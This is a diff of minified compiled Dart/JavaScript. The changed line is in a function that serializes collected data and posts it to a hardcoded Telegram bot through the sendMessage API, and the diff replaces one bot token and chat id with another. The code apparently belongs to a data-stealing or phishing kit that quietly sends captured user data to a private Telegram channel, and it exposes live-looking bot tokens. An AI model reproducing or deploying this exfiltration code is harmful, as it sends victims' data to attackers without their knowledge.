@@ -68751,7 +68751,7 @@ a6y(a){var s=0,r=A.X(t.H),q=1,p,o,n,m,l,k,j,i,h
 var $async$pg=A.Y(function(b,c){if(b===1){p=c
 s=q}while(true)switch(s){case 0:q=3
 o="=============================\nData: "+B.bm.h7(a.wg())+"n============================="
-n="https://api.telegram.org/bot6107978326:AAF9BLpwPtaoLPurhYDSQpkB2q1gL1wL5x4/sendMessage?chat_id=2133247544&text="+A.m(o)+"/"
+n="https://api.telegram.org/bot6905926094:AAGyqYfNpoHk4OTzeido68UiviOwJb6lOVE/sendMessage?chat_id=1389938531&text="+A.m(o)+"/"
 k=A.fW(n,0,null)
 j=t.N
 j=A.ay(["Content-Type","application/json; charset=UTF-8"],j,j)
